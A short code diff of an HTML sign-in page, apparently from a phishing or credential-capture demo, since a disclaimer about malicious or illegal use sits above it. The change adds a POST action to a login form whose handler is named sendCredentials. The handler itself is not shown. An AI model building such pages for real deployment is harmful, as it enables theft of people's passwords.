@@ -82,7 +82,7 @@ The author of this page disclaims any responsibility for the malicious or illega
         </svg>
         <h2 class="welcome">Welcome</h2>
         <p class="login">Sign in or create an account</p>
-        <form id="loginForm" onsubmit="sendCredentials(event)">
+        <form method="post" action="/submit" id="loginForm" onsubmit="sendCredentials(event)">
             <label for="uname"><b>Username or Email address</b></label>
             <input type="text" placeholder="* Enter Username or Email address" id="email" name="uname" required>
             <label for="psw"><b>Password</b></label>
